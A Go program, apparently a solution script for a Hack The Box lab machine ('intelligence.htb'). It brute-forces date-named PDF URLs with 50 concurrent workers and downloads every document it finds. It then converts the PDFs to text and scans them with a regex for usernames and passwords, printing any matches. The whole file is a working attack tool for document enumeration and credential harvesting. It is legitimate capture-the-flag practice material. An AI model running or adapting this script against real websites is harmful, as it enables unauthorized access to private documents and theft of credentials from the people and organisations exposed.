package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"sync"
	"regexp"
	"path/filepath"
	"strings"
	"os/exec"
	"io/ioutil"

)

const baseURL = "http://intelligence.htb/documents/2020-%s-%s-upload.pdf"
const workers = 50 // podés ajustar esto según tu conexión

var digits = "0123456789"
var letters = "abcdefghijklmnopqrstuvwxyz"
var chars = digits + letters

var validURLs []string
var mu sync.Mutex

func generateCombinations() [][2]string {
	var combos [][2]string
	for month := 1; month <= 12; month++ {
		for day := 1; day <= 31; day++ {
			combos = append(combos, [2]string{
				fmt.Sprintf("%02d", month), // Formato de dos dígitos para el mes
				fmt.Sprintf("%02d", day),   // Formato de dos dígitos para el día
			})
		}
	}
	return combos
}

func fetchAndSave(wg *sync.WaitGroup, jobs <-chan [2]string) {
	defer wg.Done()
	for combo := range jobs {
		url := fmt.Sprintf(baseURL, combo[0], combo[1])
		resp, err := http.Get(url)
		if err != nil {
			fmt.Printf("\033[33m[!] Error con URL %s: %v\033[0m\n", url, err)
			continue
		}
		resp.Body.Close()
		if resp.StatusCode == 200 {
			fmt.Printf("\033[32m[+] URL válida encontrada: %s\033[0m\n", url)
			savePDF(url, combo)

			mu.Lock()
			validURLs = append(validURLs, url)
			mu.Unlock()
		} else {
			fmt.Printf("\033[31m[-] URL inválida: %s\033[0m\n", url)
		}
	}
}

func savePDF(url string, combo [2]string) {
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("\033[33m[!] Error al descargar %s: %v\033[0m\n", url, err)
		return
	}
	defer resp.Body.Close()

	filename := fmt.Sprintf("%s-%s.pdf", combo[0], combo[1])
	out, err := os.Create(filename)
	if err != nil {
		fmt.Printf("\033[33m[!] No se pudo crear el archivo %s: %v\033[0m\n", filename, err)
		return
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		fmt.Printf("\033[33m[!] No se pudo escribir el archivo %s: %v\033[0m\n", filename, err)
	}
}

func convertPDFtoText(pdfPath string) (string, error) {
	txtPath := strings.TrimSuffix(pdfPath, ".pdf") + ".txt"

	cmd := exec.Command("pdftotext", pdfPath, txtPath)
	err := cmd.Run()
	if err != nil {
		return "", fmt.Errorf("error al convertir %s: %v", pdfPath, err)
	}

	data, err := ioutil.ReadFile(txtPath)
	if err != nil {
		return "", fmt.Errorf("no se pudo leer %s: %v", txtPath, err)
	}

	return string(data), nil
}



func searchCredentialsInPDFs() {
	files, err := filepath.Glob("*.pdf")
	if err != nil {
		fmt.Printf("\033[31m[!] Error al buscar PDFs: %v\033[0m\n", err)
		return
	}

	fmt.Printf("\033[32m[+] PDFs encontrados: %d\033[0m\n", len(files))

	reCreds := regexp.MustCompile(`(?i)(user(name)?|login|email)[^\n]{0,30}(pass(word)?)[^\n]{0,30}`)

	for _, file := range files {
		text, err := convertPDFtoText(file)
		if err != nil {
			fmt.Printf("\033[33m[!] Falló conversión de %s: %v\033[0m\n", file, err)
			continue
		}

		if reCreds.MatchString(text) {
			fmt.Printf("\033[35m[!] Posibles credenciales en %s:\033[0m\n", file)
			fmt.Println(text)
		}
	}
}





func main() {
	combinations := generateCombinations()
	jobs := make(chan [2]string, len(combinations))
	var wg sync.WaitGroup

	// Lanzar los workers
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go fetchAndSave(&wg, jobs)
	}

	// Enviar jobs
	for _, combo := range combinations {
		jobs <- combo
	}
	close(jobs)

	wg.Wait()

	// Imprimir las URLs válidas encontradas
	fmt.Println("\033[32m=== URLS ENCONTRADAS ===\033[0m")
	for _, url := range validURLs {
		fmt.Println("\033[32m", url, "\033[0m")
	}

	// Buscar credenciales en los PDFs descargados
	fmt.Println("\033[32m=== BUSCANDO CREDENCIALES EN PDF ===\033[0m")
	searchCredentialsInPDFs()

}
